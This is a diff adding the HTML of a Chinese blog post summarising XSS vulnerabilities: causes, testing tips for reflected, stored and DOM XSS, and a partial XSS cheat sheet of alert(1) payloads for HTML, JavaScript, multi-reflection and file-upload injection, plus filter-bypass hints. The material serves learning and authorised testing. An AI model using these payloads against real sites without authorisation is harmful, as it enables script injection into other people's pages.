@@ -1,0 +1,4115 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Y1ZkRA">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Y1ZkRA">
+    
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="漏洞原理 漏洞测试 反射型XSS 存储型xss DOM xss 一些技巧 XSS_Cheat_Sheet_2020_Edition     漏洞修复 Reference    漏洞原理XSS的漏洞主要成因是后端接收参数时未经过滤，导致参数改变了HTML的结构，从而被浏览器或后端代码执行。 漏洞测试手动检测一个简单的思路为： 找到一个存在问题的地方，提交一下代码，如果出现弹窗或者打开开发者，发">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS漏洞总结">
+<meta property="og:url" content="https://yinwc.github.io/2020/06/28/XSS%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="漏洞原理 漏洞测试 反射型XSS 存储型xss DOM xss 一些技巧 XSS_Cheat_Sheet_2020_Edition     漏洞修复 Reference    漏洞原理XSS的漏洞主要成因是后端接收参数时未经过滤，导致参数改变了HTML的结构，从而被浏览器或后端代码执行。 漏洞测试手动检测一个简单的思路为： 找到一个存在问题的地方，提交一下代码，如果出现弹窗或者打开开发者，发">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-06-28T08:19:43.000Z">
+<meta property="article:modified_time" content="2023-01-28T08:23:59.432Z">
+<meta property="article:author" content="Y1ZkRA">
+<meta property="article:tag" content="漏洞">
+<meta name="twitter:card" content="summary">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/ywc.ico">
+    
+    <title>XSS漏洞总结 · Ywc&#39;s blog</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20211217" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20211217" as="style">
+    <link rel="stylesheet" href="/css/dark.css">
+    <link rel="stylesheet" href="/css/mobile.css?v=20211217" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20211217" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20211217" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>Ywc's blog</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">Ywc&#39;s blog</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">XSS漏洞总结</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:50vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+    
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                XSS漏洞总结
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="漏洞">漏洞</a>
+    
+</div>
+
+                
+                <!-- 文章字数统计 -->
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">10.9k</span>Reading time: <span class="post-count reading-time">51 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2020/06/28</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <!-- TOC -->
+
+<ul>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86">漏洞原理</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95">漏洞测试</a><ul>
+<li><a href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss">反射型XSS</a></li>
+<li><a href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss">存储型xss</a></li>
+<li><a href="#dom-xss">DOM xss</a></li>
+<li><a href="#%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7">一些技巧</a><ul>
+<li><a href="#xss_cheat_sheet_2020_edition">XSS_Cheat_Sheet_2020_Edition</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D">漏洞修复</a></li>
+<li><a href="#reference">Reference</a></li>
+</ul>
+<!-- /TOC -->
+
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>XSS的漏洞主要成因是后端接收参数时未经过滤，导致参数改变了HTML的结构，从而被浏览器或后端代码执行。</p>
+<h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p><strong>手动检测</strong><br>一个简单的思路为：</p>
+<p>找到一个存在问题的地方，提交一下代码，如果出现弹窗或者打开开发者，发现报错，即为XSS漏洞<br>如果没有字数限制，可以将XSS的payloads一起发过去，会更好进行测试。<br><a target="_blank" rel="noopener" href="https://github.com/pgaijin66/XSS-Payloads/blob/master/payload/payload.txt">XSS payloads</a><br>攻击代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; alert(1)&lt;/script&gt;</span><br><span class="line">&#x27;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;img/src=@ onerror=alert(1)/&gt; &#x27;&quot;&gt;&lt;img /src=@ onerror=alert(1)/&gt;</span><br><span class="line">&#x27; onmouseover=alert(1) x=&#x27;</span><br><span class="line">&quot; onmouseover=alert(1) x=&quot;</span><br><span class="line">`onmouseover=alert(1) x=`</span><br><span class="line">javascript:alert(1)</span><br><span class="line">data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&#x27;&quot;;alert(1)</span><br><span class="line">&lt;/script&gt;&lt;script&gt;alert(1)</span><br><span class="line">&#125;x:expression(alert(1))</span><br><span class="line">alert(1)//</span><br><span class="line">*/--&gt;&#x27;&quot;&gt;&lt;/iframe&gt;&lt;/script&gt;&lt;/style&gt;&lt;/title&gt;&lt;/textarea&gt;&lt;/xmp&gt;&lt;/noframes&gt;&lt;/noframes?&lt;/plaintext&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>自动化检测</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.chainnews.com/articles/375843855401.htm">https://www.chainnews.com/articles/375843855401.htm</a></p>
+<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>反射型XSS,大多是通过<code>URL</code>传播的,那么就需要思考哪些地方会出现让<code>URL</code>地址的参数在页面中显示,一般就是搜索栏，尤其是一些大型网站的站内搜索，搜索的关键词会展示在当前的页面中<br>手工挖掘之前需要先逛逛网站有哪些功能点<br><strong>思路</strong>：见框就插，改数据包中的参数，改URL中的参数，js源代码分析<br>即：先在输入框输入唯一的字符串，查看源代码字符串的位置，在输入 &lt;&gt;””&#x2F;&amp;()看过滤了什么，根据过滤的字符来构造特定的xss代码</p>
+<p>PS:谷歌内核浏览器自带XSS筛选器，所以对于反射型XSS测试，尽量不使用谷歌浏览器，可以使用火狐浏览器进行测试；</p>
+<h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h3><p>存储型 XSS 的攻击代码是存在服务器端的，因此首先需要找到该网站将数据存储到后端的功能，然后进行payload的注入</p>
+<p>评论留言处和个人资料处这些地方，存在存储型XSS漏洞的几率非常大；</p>
+<p>同时也要看一下黑名单过滤规则，想办法进行绕过，比如通过编码转换、大小写混淆或者利用一些特殊的函数、标签来绕过黑名单；</p>
+<h3 id="DOM-xss"><a href="#DOM-xss" class="headerlink" title="DOM xss"></a>DOM xss</h3><p>DOM XSS是在浏览器的解析中改变页面DOM树，且恶意代码并不在返回页面源码中回显</p>
+<p>任何漏洞都是从外部输入加上危险的操作导致的，DOM型XSS也不例外</p>
+<p>DOM型XSS中，其外部输入是JS中存在获取外部输入内容的可利用的代码如URL栏内容的location.href，然后该外部输入内容在未经过有效过滤的情况下就传入危险的输出函数直接输出到页面中或传入eval等危险执行函数就会在页面上直接解析恶意JS代码，导致DOM型XSS的存在。</p>
+<p>在进行漏洞挖掘时，注意观察用户输入的代码，若被前端JS文件解析，在客户端加载的JS代码中若存在一些前端的<a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/06/25/%E6%B5%85%E6%9E%90DOM%E5%9E%8BXSS/">属性</a>即可能存在DOM-xss漏洞</p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1606858">DOM-XSS漏洞挖掘与攻击面延申</a></p>
+<h3 id="一些技巧"><a href="#一些技巧" class="headerlink" title="一些技巧"></a>一些技巧</h3><p><strong>常规思路</strong></p>
+<p>第一层：搜集输入、输出点，输入、输出的点越多，能挖到xss漏洞的概率越大（点搜集）</p>
+<p>发现存活的标签</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;&lt;a&gt;&lt;p&gt;&lt;img&gt;&lt;body&gt;&lt;button&gt;&lt;var&gt;&lt;div&gt;&lt;iframe&gt;&lt;meta&gt;&lt;object&gt;&lt;marquee&gt;&lt;isindex &gt;&lt;input&gt;&lt;select&gt;&gt;&lt;keygen&gt;&lt;frameset&gt;&lt;embed&gt;&lt;svg&gt;&lt;math&gt;&lt;video&gt;&lt;audio&gt;&lt;textarea&gt;</span><br></pre></td></tr></table></figure>
+
+<p>第二层：就是深入到各个点，进行各个击破</p>
+<h4 id="XSS-Cheat-Sheet-2020-Edition"><a href="#XSS-Cheat-Sheet-2020-Edition" class="headerlink" title="XSS_Cheat_Sheet_2020_Edition"></a><a target="_blank" rel="noopener" href="https://github.com/heroanswer/XSS_Cheat_Sheet_2020_Edition">XSS_Cheat_Sheet_2020_Edition</a></h4><p><strong>1.HTML Injection （代码注入）</strong></p>
+<p>当输入的payload，被插入到HTML标签或外部标签的属性值内时，则使用下面的方法进行测试，如果输入的内容被插入到了HTML注释，则在payload之前添加”-&gt;”</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=alert(1)&gt;</span><br><span class="line">&quot;&gt;&lt;svg onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.HTML Injection – Tag Block Breakout（HTML注入–标签闭合）</strong></p>
+<p>当输入的payload，被插入到以下标签的内部时，使用以下标签：</p>
+<p><code>&lt;title&gt; &lt;style&gt; &lt;script&gt; &lt;textarea&gt; &lt;noscript&gt; &lt;pre&gt; &lt;xmp&gt; &lt;iframe&gt;</code> （<code>&lt;/tag&gt;</code>为相应的html标签）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;/tag&gt;&lt;svg onload=alert(1)&gt;</span><br><span class="line">&quot;&gt;&lt;/tag&gt;&lt;svg onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>3.HTML Injection - Inline （HTML注入-内联标签）</strong></p>
+<p>当输入的payload，被插入到HTML标签的属性值内，但该标签不能以大于号（<code>&gt;</code>）进行闭合。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;onmouseover=alert(1) //</span><br><span class="line">&quot;autofocus onfocus=alert(1) //</span><br></pre></td></tr></table></figure>
+
+<p><strong>4.HTML Injection - Source（HTML注入-源）</strong></p>
+<p>当输入的payload，被作为以下HTML标签属性的值使用时：<code>href</code>，<code>src</code>，<code>data</code>或<code>action</code>。payload中的<code>src</code>属性值可以是一个URL或者<code>&quot;data:,alert(1)&quot;</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)</span><br></pre></td></tr></table></figure>
+
+<p><strong>5.Javascript Injection (javascript注入)</strong></p>
+<p>当输入的payload，被插入到javascript标签块中的字符串定界值中时使用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;-alert(1)-&#x27;</span><br><span class="line">&#x27;/alert(1)//</span><br></pre></td></tr></table></figure>
+
+<p><strong>6.Javascript Injection - Escape Bypass (javascript注入-绕过)</strong></p>
+<p>当输入的payload，被插入到javascript标签块字符串定界值中，但具有单引号，可以尝试使用反斜杠注释进行绕过。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&#x27;/alert(1)//</span><br></pre></td></tr></table></figure>
+
+<p><strong>7.Javascript Injection – Script Breakout (javascript注入-脚本突破)</strong></p>
+<p>当输入的payload，被插入到javascript标签块中的任何位置时使用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/script&gt;&lt;svg onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>8.Javascript Injection - Logical Block (javscript注入-逻辑代码块)</strong></p>
+<p>当输入的payload，被插入到javascript标签块时，使用第一个或第二个payload，该值如果位于字符串分隔值或在单个逻辑代码块（如函数或条件（<code>if，else</code>，等等中）。 如果需要引用转义反斜杠，请使用第3个payload。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#125;alert(1);&#123;&#x27;</span><br><span class="line">&#x27;&#125;alert(1)%0A&#123;&#x27;</span><br><span class="line">\&#x27;&#125;alert(1);&#123;//</span><br></pre></td></tr></table></figure>
+
+<p><strong>9.Javascript Injection - Quoteless (javscript注入-无变量名)</strong></p>
+<p>当输入的payload在同一行javascript代码中有多次反射时使用。</p>
+<p>第一个payload适用于简单的javascript变量，第二个payload适用于非嵌套的javascript对象。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/alert(1)//\</span><br><span class="line">/alert(1)&#125;//\</span><br></pre></td></tr></table></figure>
+
+<p><strong>10.Javascript Context - Placeholder Injection in Template Literal (javascript注入-模板文字中的占位符注入)</strong></p>
+<p>当输入的payload被插入到反引号<code>（``）</code>分隔的字符串内或模板引擎中时使用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;alert(1)&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>11.Multi Reflection HTML Injection - Double Reflection (Single Input) (HTML注入多重反射-双重反射（单输入）)</strong></p>
+<p>payload用于利用同一页面上的多次反射。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;onload=alert(1)&gt;&lt;svg/1=&#x27;</span><br><span class="line">&#x27;&gt;alert(1)&lt;/script&gt;&lt;script/1=&#x27;</span><br><span class="line">*/alert(1)&lt;/script&gt;&lt;script&gt;/*</span><br></pre></td></tr></table></figure>
+
+<p><strong>12.Multi Reflection i HTML Injection - Triple Reflection (Single Input) (HTML注入多重反射-三次反射（单输入）)</strong></p>
+<p>payload用于利用同一页面上的多次反射。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*/alert(1)&quot;&gt;&#x27;onload=&quot;/*&lt;svg/1=&#x27;</span><br><span class="line">`-alert(1)&quot;&gt;&#x27;onload=&quot;`&lt;svg/1=&#x27;</span><br><span class="line">*/&lt;/script&gt;&#x27;&gt;alert(1)/*&lt;script/1=&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>13.Multi Input Reflections HTML Injection - Double &amp; Triple (HTML注入多输入反射-两次和三次)</strong></p>
+<p>payload用于利用同一页面上的多个输入反射。在<code>HPP</code>（HTTP参数污染）其中存在重复参数的反射。 第三个payload利用相同参数的逗号分隔进行反射。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p=&lt;svg/1=&#x27;&amp;q=&#x27;onload=alert(1)&gt;</span><br><span class="line">p=&lt;svg 1=&#x27;&amp;q=&#x27;onload=&#x27;/*&amp;r=*/alert(1)&#x27;&gt;</span><br><span class="line">q=&lt;script/&amp;q=/src=data:&amp;q=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>14.File Upload Injection – Filename (文件上传注入-文件名)</strong></p>
+<p>payload用于用户上传的文件名返回在目标页面的某处时使用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;svg onload=alert(1)&gt;.gif</span><br></pre></td></tr></table></figure>
+
+<p><strong>15.File Upload Injection – Metadata (文件上传注入-元数据)</strong></p>
+<p>payload用于，当上传文件的元数据返回在目标页面中的某处时使用。 它可以使用命令行<code>exiftool</code>（”$”是终端提示），并且可以设置任何元数据字段。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ exiftool -Artist=&#x27;&quot;&gt;&lt;svg onload=alert(1)&gt;&#x27; xss.jpeg</span><br></pre></td></tr></table></figure>
+
+<p><strong>16.File Upload Injection – SVG File (文件上传注入-SVG文件)</strong></p>
+<p>上传图像文件时，用于在目标上创建存储的XSS payload。 将以下内容另存为<code>&quot;xss.svg&quot;</code>文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; onload=&quot;alert(1)&quot;/&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>17.DOM Insert Injection (DOM 注入)</strong></p>
+<p>当注入的payload作为有效标记插入DOM中，而不是反映在源代码中时，用于测试XSS。</p>
+<p>它适用于html标签和其他payload无效的情况下使用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br><span class="line">&lt;iframe src=javascript:alert(1)&gt;</span><br><span class="line">&lt;details open ontoggle=alert(1)&gt;</span><br><span class="line">&lt;svg&gt;&lt;svg onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
